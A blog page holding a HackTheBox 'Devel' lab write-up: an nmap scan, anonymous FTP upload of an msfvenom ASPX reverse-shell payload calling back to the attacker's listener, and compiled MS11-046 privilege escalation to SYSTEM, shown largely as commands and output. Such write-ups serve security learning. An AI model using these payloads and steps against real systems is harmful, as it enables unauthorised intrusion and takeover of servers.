<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Marco Meli">
  <meta name="description" content="Devel | Recon root@SittingDucks:~# nmap -p- -sV -sC 10.10.10.5 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 18:44 GMT Nmap scan report for...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">

  
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>

  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">

  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
  <script src="/tipuesearch_content.js"></script>
  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
  <script src="/theme/tipuesearch/tipuesearch.js"></script>
 


<meta name="keywords" content="HackTheBox">


  <title>Devel</title>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-156989597-1', 'auto');
  ga('send', 'pageview');

</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-default" role="navigation"> 
	  
		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
		</form>
		
        <div class="container">
          <div class="row">
            <div class="site-navigation-inner col-sm-12">
              <div class="navbar-header">
                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                </button>
              </div>
              <div class="collapse navbar-collapse navbar-ex1-collapse">
              <ul id="menu-all-pages" class="nav navbar-nav">
                <li class="menu-item"><a href="htts://sittingducks.io" >home
<i class="fa  fa-lg"></i></a></li>
              </ul>
              </div>
              <div class="social">   
                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
<i class="fa fa-linkedin fa-lg"></i></a>
                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
<i class="fa fa-twitter fa-lg"></i></a>
                <a href="https://github.com/M4rc0ff" title="github" >
<i class="fa fa-github fa-lg"></i></a>
              </div>
            </div>
          </div>
        </div>
      </nav><!-- .site-navigation -->

      <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2020-02-23 22:06:00+00:00">Sun 23 February 2020</time></span>
        <h1 class="entry-title"><a href="https://sittingducks.io/Devel.html">Devel</a></h1>
      </header><!-- .entry-header -->
      <div class="fb-like" data-href="https://sittingducks.io/Devel.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
      <div class="entry-content">
        <h1 id="recon">Recon</h1>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p- -sV -sC <span class="m">10</span>.10.10.5
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 18:44 GMT</span>
<span class="go">Nmap scan report for 10.10.10.5</span>
<span class="go">Host is up (0.065s latency).</span>
<span class="go">Not shown: 65533 filtered ports</span>
<span class="go">PORT   STATE SERVICE VERSION</span>
<span class="go">21/tcp open  ftp     Microsoft ftpd</span>
<span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
<span class="go">| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span>
<span class="go">| 03-17-17  04:37PM                  689 iisstart.htm</span>
<span class="go">| 02-27-20  04:03AM       &lt;DIR&gt;          thirty6</span>
<span class="go">|_03-17-17  04:37PM               184946 welcome.png</span>
<span class="go">| ftp-syst: </span>
<span class="go">|_  SYST: Windows_NT</span>
<span class="go">80/tcp open  http    Microsoft IIS httpd 7.5</span>
<span class="go">| http-methods: </span>
<span class="go">|_  Potentially risky methods: TRACE</span>
<span class="go">|_http-server-header: Microsoft-IIS/7.5</span>
<span class="go">|_http-title: IIS7</span>
<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>

<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 151.47 seconds</span>
</pre></div>


<p>nmap reveals that there is an FTP server running on port 21 and anonymous authentication is allowed. There is also an IIS server (version 7.5) on port 80 which most probably works in combination with the FTP server. We can easily verify that.</p>
<p>Navigating to the webserver we get this:</p>
<p><img alt="" src="../images/develIS.png"></p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> ftp <span class="m">10</span>.10.10.5
<span class="go">Connected to 10.10.10.5.</span>
<span class="go">220 Microsoft FTP Service</span>
<span class="go">Name (10.10.10.5:user): anonymous</span>
<span class="go">331 Anonymous access allowed, send identity (e-mail name) as password.</span>
<span class="go">Password:</span>
<span class="go">230 User logged in.</span>
<span class="go">Remote system type is Windows_NT.</span>
<span class="go">ftp&gt;</span>
</pre></div>


<p>As shown above I used the anonymous user and a random password and I authenticated successfully.</p>
<p>Now I create a simple html file in my kali box and I add the text hello World! inside. Then I upload this file into the ftp server:</p>
<div class="highlight"><pre><span></span><span class="go">ftp&gt; put test.html</span>
<span class="go">local: test.html remote: test.html</span>
<span class="go">200 PORT command successful.</span>
<span class="go">125 Data connection already open; Transfer starting.</span>
<span class="go">226 Transfer complete.</span>
<span class="go">14 bytes sent in 0.00 secs (976.5625 kB/s)</span>
<span class="go">ftp&gt; dir</span>
<span class="go">200 PORT command successful.</span>
<span class="go">125 Data connection already open; Transfer starting.</span>
<span class="go">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span>
<span class="go">03-17-17  04:37PM                  689 iisstart.htm</span>
<span class="go">02-27-20  06:30PM                   14 test.html</span>
<span class="go">03-17-17  04:37PM               184946 welcome.png</span>
<span class="go">226 Transfer complete.</span>
<span class="go">ftp&gt; </span>
</pre></div>


<p>then I browse to that address:</p>
<p><img alt="" src="../images/develHW.png"></p>
<p>This confirms that we can upload stuff into the ftp server and we can execute it using the webserver since they work in combination.</p>
<p>Using the same concept we can upload a webshell. IIS 7.5 supports aspx so we can create an aspx webshell with msfvenom:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.17 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f aspx &gt; reverse.aspx
<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span class="go">[-] No arch selected, selecting arch: x86 from the payload</span>
<span class="go">No encoder or badchars specified, outputting raw payload</span>
<span class="go">Payload size: 324 bytes</span>
<span class="go">Final size of aspx file: 2699 bytes</span>
<span class="gp">root@SittingDucks:~#</span> ll
<span class="go">total 4</span>
<span class="go">-rw-rw-r-- 1 root root 2699 Feb 24 08:47 reverse.aspx</span>
</pre></div>


<p>then I upload it to the ftp server:</p>
<div class="highlight"><pre><span></span><span class="go">ftp&gt; put reverse.aspx</span>
<span class="go">local: reverse.aspx remote: reverse.aspx</span>
<span class="go">200 PORT command successful.</span>
<span class="go">125 Data connection already open; Transfer starting.</span>
<span class="go">226 Transfer complete.</span>
<span class="go">2734 bytes sent in 0.00 secs (36.7232 MB/s)</span>
<span class="go">ftp&gt; </span>
</pre></div>


<p>After setting up a netcat listener on port 443 and hitting the address http://10.10./10.5/reverse.aspx I get a shell back as the iis user web:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lnvp <span class="m">443</span>
<span class="go">listening on [any] 443 ...</span>
<span class="go">connect to [10.10.14.17] from (UNKNOWN) [10.10.10.5] 49166</span>
<span class="go">Microsoft Windows [Version 6.1.7600]</span>
<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>

<span class="go">c:\windows\system32\inetsrv&gt;whoami</span>
<span class="go">whoami</span>
<span class="go">iis apppool\web</span>

<span class="go">c:\windows\system32\inetsrv&gt;</span>
</pre></div>


<p>having a look there seem to a user called babis further to Administrator. If I try to access both users directories I get access denied. </p>
<div class="highlight"><pre><span></span><span class="go">c:\Users&gt;dir</span>
<span class="go">dir</span>
<span class="go"> Volume in drive C has no label.</span>
<span class="go"> Volume Serial Number is 8620-71F1</span>

<span class="go"> Directory of c:\Users</span>

<span class="go">18/03/2017  01:16     &lt;DIR&gt;          .</span>
<span class="go">18/03/2017  01:16     &lt;DIR&gt;          ..</span>
<span class="go">18/03/2017  01:16     &lt;DIR&gt;          Administrator</span>
<span class="go">17/03/2017  04:17     &lt;DIR&gt;          babis</span>
<span class="go">18/03/2017  01:06     &lt;DIR&gt;          Classic .NET AppPool</span>
<span class="go">14/07/2009  09:20     &lt;DIR&gt;          Public</span>
<span class="go">               0 File(s)              0 bytes</span>
<span class="go">               6 Dir(s)  24.604.782.592 bytes free</span>

<span class="go">c:\Users&gt;cd babis</span>
<span class="go">cd babis</span>
<span class="go">Access is denied.</span>

<span class="go">c:\Users&gt;</span>
</pre></div>


<p>Let's get the systeminfo:</p>
<div class="highlight"><pre><span></span><span class="go">c:\Users&gt;systeminfo</span>
<span class="go">systeminfo</span>

<span class="go">Host Name:                 DEVEL</span>
<span class="go">OS Name:                   Microsoft Windows 7 Enterprise </span>
<span class="go">OS Version:                6.1.7600 N/A Build 7600</span>
<span class="go">OS Manufacturer:           Microsoft Corporation</span>
<span class="go">OS Configuration:          Standalone Workstation</span>
<span class="go">OS Build Type:             Multiprocessor Free</span>
<span class="go">Registered Owner:          babis</span>
<span class="go">Registered Organization:   </span>
<span class="go">Product ID:                55041-051-0948536-86302</span>
<span class="go">Original Install Date:     17/3/2017, 4:17:31 </span>
<span class="go">System Boot Time:          27/2/2020, 6:06:31 </span>
<span class="go">System Manufacturer:       VMware, Inc.</span>
<span class="go">System Model:              VMware Virtual Platform</span>
<span class="go">System Type:               X86-based PC</span>
<span class="go">Processor(s):              1 Processor(s) Installed.</span>
<span class="go">                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
<span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018</span>
<span class="go">Windows Directory:         C:\Windows</span>
<span class="go">System Directory:          C:\Windows\system32</span>
<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
<span class="go">System Locale:             el;Greek</span>
<span class="go">Input Locale:              en-us;English (United States)</span>
<span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span>
<span class="go">Total Physical Memory:     1.023 MB</span>
<span class="go">Available Physical Memory: 668 MB</span>
<span class="go">Virtual Memory: Max Size:  2.047 MB</span>
<span class="go">Virtual Memory: Available: 1.505 MB</span>
<span class="go">Virtual Memory: In Use:    542 MB</span>
<span class="go">Page File Location(s):     C:\pagefile.sys</span>
<span class="go">Domain:                    HTB</span>
<span class="go">Logon Server:              N/A</span>
<span class="go">Hotfix(s):                 N/A</span>
<span class="go">Network Card(s):           1 NIC(s) Installed.</span>
<span class="go">                           [01]: Intel(R) PRO/1000 MT Network Connection</span>
<span class="go">                                 Connection Name: Local Area Connection</span>
<span class="go">                                 DHCP Enabled:    No</span>
<span class="go">                                 IP address(es)</span>
<span class="go">                                 [01]: 10.10.10.5</span>
</pre></div>


<p>From the systeminfo output I get that Windows version is 6.1.7600 N/A Build 7600. If I google that string the first result I get is the following privesc exploit:</p>
<p>https://www.exploit-db.com/exploits/40564</p>
<p>I download it and compile the <code>C</code> file:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/devel#</span> i686-w64-mingw32-gcc <span class="m">40564</span>.c -o MS11-046.exe -lws2_32
<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/devel#</span> ll
<span class="go">total 344</span>
<span class="go">-rw-rw-r-- 1 root root  31866 Feb 24 12:22 40564.c</span>
<span class="go">-rwxrwxr-x 1 root root 299312 Feb 24 13:08 MS11-046.exe</span>
</pre></div>


<p>Then I upload it with ftp:</p>
<div class="highlight"><pre><span></span><span class="go">ftp&gt; put MS11-046.exe                                                                          </span>
<span class="go">local: MS11-046.exe remote: MS11-046.exe   </span>
<span class="go">200 PORT command successful.                                                                                                                                                                  </span>
<span class="go">125 Data connection already open; Transfer starting.                                           </span>
<span class="go">226 Transfer complete.                                                                                                                                                                        </span>
<span class="go">299312 bytes sent in 0.36 secs (807.2827 kB/s)</span>
</pre></div>


<p>The defaule IIS working directory in Windows is c:\inetpub\wwwroot so I move there: </p>
<div class="highlight"><pre><span></span><span class="go">c:\inetpub\wwwroot&gt;dir</span>
<span class="go">dir</span>
<span class="go"> Volume in drive C has no label.</span>
<span class="go"> Volume Serial Number is 8620-71F1</span>

<span class="go"> Directory of c:\inetpub\wwwroot</span>

<span class="go">27/02/2020  07:40     &lt;DIR&gt;          .</span>
<span class="go">27/02/2020  07:40     &lt;DIR&gt;          ..</span>
<span class="go">18/03/2017  01:06     &lt;DIR&gt;          aspnet_client</span>
<span class="go">17/03/2017  04:37                689 iisstart.htm</span>
<span class="go">27/02/2020  07:42             65.686 MS11-046.exe</span>
<span class="go">27/02/2020  06:50              2.734 reverse.aspx</span>
<span class="go">27/02/2020  06:30                 14 test.html</span>
<span class="go">17/03/2017  04:37            184.946 welcome.png</span>
<span class="go">               5 File(s)        254.069 bytes</span>
<span class="go">               3 Dir(s)  24.604.094.464 bytes free</span>
</pre></div>


<p>Then I run the exploit:</p>
<div class="highlight"><pre><span></span><span class="go">c:\inetpub\wwwroot&gt;MS11-046.exe</span>
<span class="go">MS11-046.exe</span>

<span class="go">c:\Windows\System32&gt;whoami</span>
<span class="go">whoami</span>
<span class="go">nt authority\system</span>
</pre></div>


<p>Now we can easy get the user flag</p>
<div class="highlight"><pre><span></span><span class="go">c:\Users\babis\Desktop&gt;more user.txt.txt                                                                       </span>
<span class="go">more user.txt.txt                 </span>
<span class="go">9e****************************e8 </span>
</pre></div>


<p>and the root flag</p>
<div class="highlight"><pre><span></span><span class="go">c:\Users\Administrator\Desktop&gt;more root.txt.txt</span>
<span class="go">more root.txt.txt</span>
<span class="go">e6****************************4b</span>
</pre></div>
			<style>
#pcs-comment-form input,
#pcs-comment-form textarea {
	width: 100%;
}
#pcs-comment-form-display-replyto {
	border: solid 1px black;
	padding: 2px;
}
#pcs-comment-form-display-replyto p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}
#pcs-comments ul {
	list-style: none;
}
#pcs-comments .comment-left {
	display: table-cell;
	padding-right: 10px;
}
#pcs-comments .comment-body {
	display: table-cell;
	vertical-align: top;
	width: 100%;
}
</style>

	<section id="pcs-comments">
	<header>
		<h2>Comments</h2>
		<hr/>
	</header>
		<p>There are no comments yet.</p>
	<section>
	<form id="pcs-comment-form" action="#">
		<legend>Add a Comment</legend>
		<input type="hidden" id="pcs-comment-form-input-replyto">
		<fieldset>
			<label for="pcs-comment-form-input-name">Name</label>
			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
		</fieldset>
		<fieldset>
			<label for="pcs-comment-form-input-website">Website</label>
			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
		</fieldset>
		<fieldset>
			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
		</fieldset>

		<button type="submit"
				id="pcs-comment-form-button-submit"
				>Post via email</button>

			<a href="https://sittingducks.io/feeds/comment.Devel.atom.xml">
				Comment Atom Feed
			</a>
	</form>
</section>

</section>

			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			CommentSystem.email_user   = "sittingducks.io";
			CommentSystem.email_domain = "protonmail.com";
			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
				return ''
					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
					+ 	'Ã—'
					+ '</button>'
					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
			};

			$('#pcs-comment-form').on("submit",
				function( event )
				{
					event.preventDefault();
					$(location).attr('href', CommentSystem.getMailtoLink("Devel"));
				}
			);
		});
	</script>


      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->




  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>

  
 <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
	<!-- Make sure jquery is loaded first, then load colorbox -->
  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>


  
  
</body>
</html>